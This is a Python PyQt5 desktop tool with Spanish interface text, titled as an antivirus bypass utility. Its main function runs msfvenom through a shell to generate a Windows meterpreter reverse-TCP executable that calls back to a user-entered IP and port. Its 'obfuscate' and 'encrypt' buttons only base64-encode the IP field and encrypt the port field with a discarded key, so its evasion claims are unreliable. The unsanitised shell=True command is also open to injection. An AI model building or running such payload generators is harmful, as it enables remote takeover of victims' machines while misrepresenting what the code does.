import os
import sys
import base64
import subprocess
from cryptography.fernet import Fernet
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QLabel, QTextEdit,
                             QPushButton, QCheckBox, QVBoxLayout, QHBoxLayout, QGridLayout,
                             QTabWidget, QLineEdit, QMessageBox, QFileDialog)
from PyQt5.QtGui import QIcon

class AntivirusBypassTool(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Herramienta de Bypass de Antivirus")
        self.setFixedSize(600, 400)

        # Icon
        ico_path = os.path.join(os.path.dirname(__file__), "tobproject.ico")
        if os.path.exists(ico_path):
            self.setWindowIcon(QIcon(ico_path))

        # Central Widget and Layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        # Input Fields
        ip_layout = QHBoxLayout()
        ip_label = QLabel("Dirección IP:")
        self.ip_entry = QLineEdit()
        ip_layout.addWidget(ip_label)
        ip_layout.addWidget(self.ip_entry)
        layout.addLayout(ip_layout)

        puerto_layout = QHBoxLayout()
        puerto_label = QLabel("Puerto:")
        self.puerto_entry = QLineEdit()
        puerto_layout.addWidget(puerto_label)
        puerto_layout.addWidget(self.puerto_entry)
        layout.addLayout(puerto_layout)

        # Buttons
        button_layout = QHBoxLayout()
        generar_btn = QPushButton("Generar Payload")
        generar_btn.clicked.connect(self.generar_payload)
        ofuscar_btn = QPushButton("Ofuscar Cadena")
        ofuscar_btn.clicked.connect(self.ofuscar_cadena)
        cifrar_btn = QPushButton("Cifrar Payload")
        cifrar_btn.clicked.connect(self.cifrar_payload)
        button_layout.addWidget(generar_btn)
        button_layout.addWidget(ofuscar_btn)
        button_layout.addWidget(cifrar_btn)
        layout.addLayout(button_layout)

        # Results
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

    def generar_payload(self):
        ip = self.ip_entry.text()
        puerto = self.puerto_entry.text()
        path, _ = QFileDialog.getSaveFileName(self, "Guardar Payload", "", "Executable Files (*.exe)")
        if not path:
            return
        comando = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={puerto} -f exe -o {path}"
        subprocess.run(comando, shell=True)
        QMessageBox.information(self, "Éxito", f"Payload generado exitosamente en {path}")

    def ofuscar_cadena(self):
        cadena = self.ip_entry.text()
        encoded_string = base64.b64encode(cadena.encode('utf-8')).decode('utf-8')
        self.result_text.setPlainText(f"Cadena ofuscada: {encoded_string}")

    def cifrar_payload(self):
        payload = self.puerto_entry.text()
        key = Fernet.generate_key()
        cipher_suite = Fernet(key)
        cipher_text = cipher_suite.encrypt(payload.encode())
        self.result_text.setPlainText(f"Payload cifrado: {cipher_text}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = AntivirusBypassTool()
    window.show()
    sys.exit(app.exec_())